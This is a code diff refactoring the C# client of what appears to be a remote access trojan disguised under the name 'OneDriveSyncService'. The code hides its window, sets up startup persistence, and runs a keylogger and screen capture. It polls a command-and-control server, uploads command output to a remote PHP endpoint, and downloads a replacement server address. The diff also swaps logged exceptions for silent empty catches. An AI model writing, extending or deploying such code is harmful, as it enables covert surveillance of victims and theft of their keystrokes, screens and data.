@@ -20,10 +20,9 @@ namespace OneDriveSyncService
 
         private void Form1_Shown(object sender, EventArgs e)
         {
-            
             this.Hide();
-            
-            for (; ;)
+
+            while (true)
             {
                 try
                 {
@@ -31,7 +30,7 @@ namespace OneDriveSyncService
                     UpdateServerName();
                     Join.Startup();
                     Keylogger.InitClientKeylogger(_serverName);
-                    ScreenCap.initClientDesktop(_serverName);
+                    ScreenCap.InitClientDesktop(_serverName);
                     _status = Join.JoinServer(_webClient, _serverName);
 
                     while (_status == "joined")
@@ -43,14 +42,15 @@ namespace OneDriveSyncService
 
                             if (command.Contains("message"))
                             {
-                                MessageBox.Show("Hello Friend!");
-
+                                string[] commandArgs = command.Split('"');
+                                if (commandArgs.Length > 0)
+                                {
+                                    MessageBox.Show(commandArgs[1]);
+                                }
                             }
                             else if (command.Contains("beep"))
                             {
-
                                 Console.Beep(500, 10000);
-
                             }
                             else if (command.Contains("no_command"))
                             {
@@ -79,30 +79,27 @@ namespace OneDriveSyncService
                                 _webClient.UploadString(_serverName + "/command/output.php", "name=" + name + "&returns=" + returns);
                             }
                         }
-                        catch (Exception exception)                   
+                        catch
                         {
-                            exception.ToString();
+
                         }
                         System.Threading.Thread.Sleep(5000);
                         _status = Join.JoinServer(_webClient, _serverName);
                     }
-
                 }
-                catch (Exception exception)
+                catch
                 {
-                    exception.ToString();
+
                 }
 
                 System.Threading.Thread.Sleep(5000);
-
             }
-
         }
 
         private void UpdateServerName()
         {
-            string new_host = _webClient.DownloadString(_serverUpdate);
-            _serverName = new_host;
+            string newHost = _webClient.DownloadString(_serverUpdate);
+            _serverName = newHost;
         }
     }
 }
